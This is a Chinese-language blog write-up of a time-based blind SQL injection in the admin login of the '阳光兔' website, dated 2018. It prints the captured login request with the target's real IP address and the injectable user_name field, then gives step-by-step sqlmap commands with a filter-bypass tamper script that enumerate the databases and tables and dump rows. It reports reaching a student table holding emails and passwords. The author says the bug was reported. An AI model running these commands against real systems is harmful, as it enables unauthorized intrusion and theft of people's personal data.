阳光兔后台时间注入--可脱库

2018-09-19

一、前言：

翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址
传送门，当时wooyun上爆出的漏洞
是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波
紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。

二、脱库过程：

手工注入测试出了sql时间注入漏洞，好像只过滤了空格，果断拿出sqlmap进行一下
自动脱库。

  1. 首先来看一下漏洞产生的位置，我将提交的表单数据用burp抓了一下，存储到
    post.txt 留作之后用sqlmap注入。

下面是我的post.txt文件：

POST /panel/login.php HTTP/1.1
Host: 182.92.241.143
Proxy-Connection: keep-alive
Content-Length: 57
Cache-Control: max-age=0
Origin: http://182.92.241.143
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://182.92.241.143/panel/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: hidden=value; PHPSSID=foidj69smkvieobg8q7an0qsa6

user_name=hjj&password=hjj&loginSubmit=%E7%99%BB%E5%85%A5

发生漏洞的参数为user_name，这里存在注入

  1. 使用sqlmap神器进行数据库类型猜解
python sqlmap.py -r post.txt --level=3 --tamper=space2comment

得到数据库类型为Mysql
P.S. 这里使用了一个tamper脚本，绕过网站的空格过滤机制。

  1. 数据库名的猜解
python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql

可以得到三个数据库名

information_schema
mysql
ygtoo

上面两个是mysql自带的数据库，ygtoo中一定是网站的数据库（名字也能看出来）

  1. 数据表的猜解
python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
--tables

只得到了一个数据表

increment_trx

虽然很奇怪为什么没有其它的，还是继续爆破内容，看看里面是什么再说吧。

  1. 数据表的列的猜解
python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
--T increment_trx --columns

得到了一些列名称

database
table
timestamp
checkpoint
jobid
partition

里面居然有databse和table，看看里面数据究竟有什么

  1. dump数据
python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
--T increment_trx -C "jobid,table,partition,database,timestamp,checkpoint" --dump


可以看到正在dump数据

最后爆破出数据的结果

我们在这个表中发现了ygtoo库中其他隐藏的表名！

  1. 猜解qt_student表中的列
python sqlmap.py -r post.txt --tamper=space2comment --dbms mysql -D ygtoo -T qt_student
 --columns

这个直接dump不出来，得用sqlmap的爆破猜解方式，我就猜了一小部分（14%）

可以看到里面有学生的email，密码等敏感信息。

数据太多了，我就不进行往下拖数据了，主要是没钱买服务器跑脚本qwq

三、总结：

漏洞比较小，当作实战中的练手了，sqlmap确实很强大，要不还得我自己写脚本跑。。。
也算是联系了一下sqlmap的使用吧，漏洞已经提交了，希望修复之前不要被别人利用。
